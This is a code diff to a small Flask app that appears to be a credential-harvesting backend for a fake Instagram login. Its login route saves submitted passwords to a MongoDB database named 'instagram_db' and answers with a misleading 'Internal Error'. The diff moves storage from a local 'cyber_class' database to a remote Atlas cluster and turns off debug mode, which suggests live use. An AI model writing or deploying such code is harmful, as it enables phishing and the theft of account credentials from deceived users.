@@ -3,8 +3,10 @@ from pymongo import MongoClient
 
 app = Flask(__name__)
 
-client = MongoClient("mongodb://localhost:27017/")
-db = client["cyber_class"]
+# Replace with your own Atlas connection string:
+client = MongoClient("mongodb+srv://danish:<db_password>@cluster0.wiieqp8.mongodb.net/?appName=Cluster0")
+
+db = client["instagram_db"]
 users = db["users"]
 
 @app.route("/")
@@ -21,7 +23,7 @@ def login():
         "password": password
     })
 
-    return "Check Your Internet"
+    return "Internal Error"
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run()
